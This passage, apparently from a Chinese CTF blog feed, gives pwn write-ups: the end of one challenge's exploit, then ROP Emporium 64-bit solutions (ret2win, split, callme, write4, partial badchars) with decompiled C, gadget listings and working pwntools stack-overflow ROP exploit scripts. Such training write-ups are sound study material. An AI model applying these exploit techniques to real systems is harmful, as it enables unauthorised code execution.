class="string">&#x27;9254\x20&#x27;</span>)</span><br><span class="line">s(<span class="string">&#x27;\x20&#x27;</span>)</span><br><span class="line">s(<span class="string">&#x27;\x20&#x27;</span>)</span><br><span class="line">s(<span class="string">&#x27;\x20&#x27;</span>)</span><br><span class="line">s(<span class="string">&#x27;\x20&#x27;</span>)</span><br><span class="line">ru(<span class="string">&quot;LLQPyLAOGJbnm:&quot;</span>)</span><br><span class="line">s(p64(<span class="number">0xea0e6b2caa85144a</span>))</span><br><span class="line">s(p64(<span class="number">0x60d77d2fecf1f476</span>))</span><br><span class="line">s(p64(<span class="number">0x898719894803dcd8</span>))</span><br><span class="line">s(p64(<span class="number">0x7a7306999cce11ad</span>))</span><br><span class="line">s(p64(<span class="number">0x8a42aec82ee80bd9</span>))</span><br><span class="line">s(p16(<span class="number">0x8152</span>))</span><br><span class="line"><span class="comment">#s(&quot;vkyHujGLvgxKsLsXpFvkLqaOkMVwyHXNKZglNEWOKM&quot;)</span></span><br><span class="line">ru(<span class="string">&quot;gRGKqIlcuj:&quot;</span>)</span><br><span class="line"></span><br><span class="line">backdoor=<span class="number">0x000000000040132C</span></span><br><span class="line">payload=<span class="string">&#x27;\0&#x27;</span>*(<span class="number">0xf</span>+<span class="number">8</span>)+p64(<span class="number">0x000000000040101a</span>)+p64(backdoor)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(backdoor))</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>这题虽然我做的时候是靠审的，但是看了<img src="https://mp.weixin.qq.com/s?__biz=Mzg4MjcxMTAwMQ==&mid=2247484276&idx=1&sn=bee6853198aaccecbc453d803f162847&chksm=cf53c3c2f8244ad473a9185a91a762924757d2b519d8ef7ce6dc9a0933d959717a4b4f9ec3db&mpshare=1&scene=23&srcid=0919ZeTBljLkpwRIWMK9iXaS&sharer_sharetime=1663601777105&sharer_shareid=c2da77cc73cd369928fac360210bb30b#rd" alt="其他师傅的wp">发现他们使用的是 angr，我也是第一次听说。</p>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>CTF</tag>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>ROP Emporium (64位)-writeup</title>
    <url>/2021/12/24/ROP-Emporium-64%E4%BD%8D/</url>
    <content><![CDATA[<p>部分writeup</p>
<span id="more"></span>
<h1 id="ret2win"><a href="#ret2win" class="headerlink" title="ret2win"></a>ret2win</h1><p>checksec一下，64位程序，只开启了NX保护。</p>
<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;ret2win by ROP Emporium&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;x86_64\n&quot;</span>);</span><br><span class="line">  pwnme();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nExiting&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="pwnme函数"><a href="#pwnme函数" class="headerlink" title="pwnme函数"></a>pwnme函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pwnme</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What could possibly go wrong?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You there, may I have your input please? And don&#x27;t worry about null bytes, we&#x27;re using read()!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x38</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>存在一个栈溢出漏洞，调用后门拿到flag</p>
<h3 id="后门函数"><a href="#后门函数" class="headerlink" title="后门函数"></a>后门函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ret2win</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Well done! Here&#x27;s your flag:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/cat flag.txt&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh=process(<span class="string">&#x27;./ret2win&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">40</span>+p64(<span class="number">0x400756</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="split"><a href="#split" class="headerlink" title="split"></a>split</h1><p>checksec一下，64位程序，只开启了NX保护。</p>
<h2 id="函数-1"><a href="#函数-1" class="headerlink" title="函数"></a>函数</h2><h3 id="main函数-1"><a href="#main函数-1" class="headerlink" title="main函数"></a>main函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;split by ROP Emporium&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;x86_64\n&quot;</span>);</span><br><span class="line">  pwnme();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nExiting&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="pwnme函数-1"><a href="#pwnme函数-1" class="headerlink" title="pwnme函数"></a>pwnme函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pwnme</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Contriving a reason to ask user for data...&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x60</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>存在一个栈溢出漏洞</p>
<h3 id="usefulFunction"><a href="#usefulFunction" class="headerlink" title="usefulFunction"></a>usefulFunction</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">usefulFunction</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/ls&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>属于是出题人给的hint，程序中存在system函数，也存在能调用的数据段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.data:0000000000601060	00000012	C	/bin/cat flag.txt</span><br></pre></td></tr></table></figure>

<p>由于64位程序传参(前6个)要通过寄存器 RDI、RSI、RDX、 RCX、R8 和 R9，因此我们需要构造ROP链来进行栈溢出操作。</p>
<p>查找pop rdi的地址，利用ROPgadget</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x00000000004007c3 : pop rdi ; ret</span><br></pre></td></tr></table></figure>

<h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh=process(<span class="string">&#x27;./split&#x27;</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x4007c3</span>)+p64(<span class="number">0x601060</span>)+p64(<span class="number">0x400560</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="callme"><a href="#callme" class="headerlink" title="callme"></a>callme</h1><p>checksec一下，64位程序，只开启了NX。</p>
<h2 id="函数-2"><a href="#函数-2" class="headerlink" title="函数"></a>函数</h2><h3 id="main函数-2"><a href="#main函数-2" class="headerlink" title="main函数"></a>main函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;callme by ROP Emporium&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;x86_64\n&quot;</span>);</span><br><span class="line">  pwnme();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nExiting&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="callme-two函数"><a href="#callme-two函数" class="headerlink" title="callme_two函数"></a>callme_two函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">callme_two</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 != <span class="number">0xDEADBEEFDEADBEEF</span>LL || a2 != <span class="number">0xCAFEBABECAFEBABE</span>LL || a3 != <span class="number">0xD00DF00DD00DF00D</span>LL )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Incorrect parameters&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  stream = fopen(<span class="string">&quot;key1.dat&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Failed to open key1.dat&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">    g_buf[i] ^= fgetc(stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;callme_two() called correctly&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="callme-three函数"><a href="#callme-three函数" class="headerlink" title="callme_three函数"></a>callme_three函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">callme_three</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">0xDEADBEEFDEADBEEF</span>LL &amp;&amp; a2 == <span class="number">0xCAFEBABECAFEBABE</span>LL &amp;&amp; a3 == <span class="number">0xD00DF00DD00DF00D</span>LL )</span><br><span class="line">  &#123;</span><br><span class="line">    stream = fopen(<span class="string">&quot;key2.dat&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !stream )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Failed to open key2.dat&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">16</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">      g_buf[i] ^= fgetc(stream);</span><br><span class="line">    *(_QWORD *)(g_buf + <span class="number">4</span>) ^= <span class="number">0xDEADBEEFDEADBEEF</span>LL;</span><br><span class="line">    *(_QWORD *)(g_buf + <span class="number">12</span>) ^= <span class="number">0xCAFEBABECAFEBABE</span>LL;</span><br><span class="line">    *(_QWORD *)(g_buf + <span class="number">20</span>) ^= <span class="number">0xD00DF00DD00DF00D</span>LL;</span><br><span class="line">    <span class="built_in">puts</span>(g_buf);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Incorrect parameters&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>三个函数都对附件中的文件进行了操作，应该是得到flag或者下一步提示的操作。要调用的话我们要将它们的参数分别重新设置一下。</p>
<p>因为callme函数调用后直接就exit了，所以还要找到ret地址</p>
<p>找到需要的rop</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x000000000040093c : pop rdi ; pop rsi ; pop rdx ; ret</span><br></pre></td></tr></table></figure>

<h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh=process(<span class="string">&#x27;./callme&#x27;</span>)</span><br><span class="line">set_a=p64(<span class="number">0x40093c</span>)+p64(<span class="number">0xDEADBEEFDEADBEEF</span>)+p64(<span class="number">0xCAFEBABECAFEBABE</span>)+p64(<span class="number">0xD00DF00DD00DF00D</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+set_a+p64(<span class="number">0x400720</span>)</span><br><span class="line">payload+=set_a+p64(<span class="number">0x400740</span>)</span><br><span class="line">payload+=set_a+p64(<span class="number">0x4006F0</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="write4"><a href="#write4" class="headerlink" title="write4"></a>write4</h1><p>checksec一下，64位程序，只开启了NX。</p>
<h2 id="函数-3"><a href="#函数-3" class="headerlink" title="函数"></a>函数</h2><h3 id="main函数-3"><a href="#main函数-3" class="headerlink" title="main函数"></a>main函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  pwnme(argc, argv, envp);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>pwnme函数是个外联函数，属于附件中libwrite4.so的。待会查看一下</p>
<h3 id="usefulFunction函数"><a href="#usefulFunction函数" class="headerlink" title="usefulFunction函数"></a>usefulFunction函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">usefulFunction</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> print_file(<span class="string">&quot;nonexistent&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>提示有print_file函数可以被调用</p>
<h3 id="pwnme函数-2"><a href="#pwnme函数-2" class="headerlink" title="pwnme函数"></a>pwnme函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pwnme</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;write4 by ROP Emporium&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;x86_64\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Go ahead and give me the input already!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x200</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>存在栈溢出漏洞。</p>
<h3 id="print-file函数"><a href="#print-file函数" class="headerlink" title="print_file函数"></a>print_file函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">print_file</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(a1, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Failed to open file: %s\n&quot;</span>, a1);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">33</span>, stream);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span> fclose(stream);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以用来读取有用的文件，再看看有没有可以用的数据段……好像没得</p>
<p>找到一个可读写的段，比如bss段，正好8字节长度</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">idx=23 addr=0x00001038 off=0x00001038 sz=8 vsz=8 perm=-rw- name=.bss</span><br></pre></td></tr></table></figure>

<p>查找有用的rop，就在usefulFunction函数的汇编代码下边有个usefulGadget</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000000400628</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000400628</span></span><br><span class="line">.text:<span class="number">0000000000400628</span> usefulGadgets:</span><br><span class="line">.text:<span class="number">0000000000400628</span>                 mov     [r14], r15</span><br><span class="line">.text:<span class="number">000000000040062B</span>                 retn</span><br><span class="line">.text:<span class="number">000000000040062B</span> ; ---------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>

<p>然后解题思路就很明了了，设r14和r15寄存器的值分别为bss段地址和’flag.txt’然后调用usefulGadget，然后bss段传入rdi作为usefulFunction的参数调用</p>
<p>查看有用的gadget</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0000000000400690 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400693 : pop rdi ; ret</span><br></pre></td></tr></table></figure>

<h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh=process(<span class="string">&#x27;./write4&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./write4&#x27;</span>)</span><br><span class="line">usefulGadget=<span class="number">0x400628</span></span><br><span class="line">pop_r14_r15=<span class="number">0x400690</span></span><br><span class="line">pop_rdi=<span class="number">0x400693</span></span><br><span class="line">print_file=<span class="number">0x400510</span></span><br><span class="line">bss=<span class="number">0x601038</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(pop_r14_r15)+p64(bss)+p64(<span class="number">0x7478742e67616c66</span>)+p64(usefulGadget)+p64(pop_rdi)+p64(bss)+p64(print_file)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="badchars"><a href="#badchars" class="headerlink" title="badchars"></a>badchars</h1><h2 id="函数-4"><a href="#函数-4" class="headerlink" title="函数"></a>函数</h2><h3 id="main函数-4"><a href="#main函数-4" class="headerlink" title="main函数"></a>main函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  pwnme(argc, argv, envp);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>pwnme函数是外联函数待会看</p>
<h3 id="usefulFunction函数-1"><a href="#usefulFunction函数-1" class="headerlink" title="usefulFunction函数"></a>usefulFunction函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">usefulFunction</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> print_file(<span class="string">&quot;nonexistent&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>print_file函数也是外联函数</p>
<h3 id="pwnme函数-3"><a href="#pwnme函数-3" class="headerlink" title="pwnme函数"></a>pwnme函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pwnme</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v1; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 i; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 j; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">32</span>]; <span class="comment">// [rsp+20h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;badchars by ROP Emporium&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;x86_64\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="keyword">sizeof</span>(v4));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;badchars are: &#x27;x&#x27;, &#x27;g&#x27;, &#x27;a&#x27;, &#x27;.&#x27;&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  v1 = read(<span class="number">0</span>, v4, <span class="number">0x200</span>uLL);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt; v1; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0LL</span>; j &lt;= <span class="number">3</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4[i] == badcharacters[j] )</span><br><span class="line">        v4[i] = <span class="number">-21</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>存在一个栈溢出</p>
<h3 id="print-file"><a href="#print-file" class="headerlink" title="print_file"></a>print_file</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">print_file</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(a1, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Failed to open file: %s\n&quot;</span>, a1);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">33</span>, stream);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span> fclose(stream);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为做过wirte4的原因，我首先就去看了看text段，果然有usefulGadget</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000000400628</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000400628</span></span><br><span class="line">.text:<span class="number">0000000000400628</span> usefulGadgets:</span><br><span class="line">.text:<span class="number">0000000000400628</span>                 <span class="keyword">xor</span>     [r15], r14b</span><br><span class="line">.text:<span class="number">000000000040062B</span>                 retn</span><br><span class="line">.text:<span class="number">000000000040062</span>C ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">000000000040062</span>C                 add     [r15], r14b</span><br><span class="line">.text:<span class="number">000000000040062F</span>                 retn</span><br><span class="line">.text:<span class="number">0000000000400630</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000400630</span>                 sub     [r15], r14b</span><br><span class="line">.text:<span class="number">0000000000400633</span>                 retn</span><br><span class="line">.text:<span class="number">0000000000400634</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000400634</span>                 mov     [r13+<span class="number">0</span>], r12</span><br><span class="line">.text:<span class="number">0000000000400638</span>                 retn</span><br><span class="line">.text:<span class="number">0000000000400638</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000400639</span>                 align <span class="number">20</span>h</span><br><span class="line">.text:<span class="number">0000000000400640</span></span><br><span class="line">.text:<span class="number">0000000000400640</span> ; =============== S U B R O U T I N E =======================================</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>没有可用的数据段，找一个可读写的自己写，比如bss段，正好8字节</p>
